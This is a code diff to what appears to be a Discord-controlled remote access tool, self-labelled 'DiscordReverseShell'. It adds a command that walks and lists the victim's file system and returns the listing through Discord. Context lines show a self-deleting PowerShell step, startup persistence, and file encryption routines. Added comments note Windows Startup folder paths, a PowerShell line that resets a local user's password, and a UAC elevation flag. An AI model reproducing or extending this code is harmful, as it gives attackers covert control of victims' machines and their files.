@@ -115,6 +115,7 @@ def check_token(token):
     else:
         return False
 
+
 def check_internet():
     try:
         response = requests.get("http://www.google.com", timeout=5)
@@ -122,7 +123,25 @@ def check_internet():
         return True
     except requests.RequestException:
         return False
-    
+
+
+
+def list_dir(path):
+    dir = []
+
+    for root, dirs, files in os.walk(path):
+        level = root.replace(path, "").count(os.sep)
+        indent = " " * 4 * (level)
+        #print("{}{}/".format(indent, os.path.basename(root)))
+        dir.append("{}{}/".format(indent, os.path.basename(root)))
+        subindent = " " * 4 * (level + 1)
+
+        for file in files:
+            dir.append("{}{}".format(subindent, file))
+            #print("{}{}".format(subindent, file))
+
+    return "\n".join(dir)
+
 
 
 commands = "\n\r".join([
@@ -179,6 +198,7 @@ def decrypt(file, key):
             open(file, "wb").write(encrypted)
         except: return False
     else: return False
+
 
 
 class PyAudioPCM(discord.AudioSource):
@@ -971,6 +991,37 @@ async def on_message(message):
         return
 
 
+#! FILE EXPLORER
+    elif message.content.startswith("fs"):
+        
+        path = message.content[3:]
+        if os.path.isdir(path): 
+            await message.reply("Invalid path!")
+            return
+
+        dir = list_dir(os.getcwd() if not path else path)
+
+        if len(dir) > 1500 and len(dir) < 5000:
+            open(f"{os.getenv('temp')}/dir.txt", "w", encoding="utf8").write(dir)
+
+            file = discord.File(f"{os.getenv('temp')}/dir.txt")
+
+            embed = discord.Embed(title="FS Explorer",  description="```FS explorer```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            await message.reply(embed=embed, file=file)
+
+            return
+        elif len(dir) < 1500:
+            embed = discord.Embed(title="FS Explorer",  description=f"```{dir}```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            await message.reply(embed=embed) 
+
+        else:
+            embed = discord.Embed(title="FS Explorer - Error",  description="```Scan too big!```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            await message.reply(embed=embed) 
+
+
 #SELF DESTRUCT
     elif message.content.startswith("!selfdestruct"):
         if message.content.startswith("!selfdestruct CONFIRM"):
@@ -990,7 +1041,7 @@ async def on_message(message):
 
             #cmd = f"powershell Start-Sleep -Seconds 5; Remove-Item -Path '{dir}' -Recurse -Force"
             cmd = f"powershell Start-Sleep -Seconds 5; Remove-Item -Path '{sys.argv[0]}'"
-            subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
+            subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP) #creationflags=subprocess.CREATE_NO_WINDOW
             sys.exit(0)
         else:
             embed = discord.Embed(title="Self destruct",  description="```Please use '!selfdestruct CONFIRM' to confirm this action!```", color=0xfafafa)
@@ -1032,4 +1083,19 @@ else: Startup(sys.argv[0])
 #subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 #subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+#C:\Users\Korisnik\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+
+
+#C:\Users\Korisnik\AppData\Roaming\MicrosoftWindows\System
+
+
+
+#f"Get-LocalUser -Name '{username}' | Reset-LocalUserPassword -NewPassword (ConvertTo-SecureString -String '{password}' -AsPlainText -Force)"
+
+
+
+#start as admin: --uac-admin
 
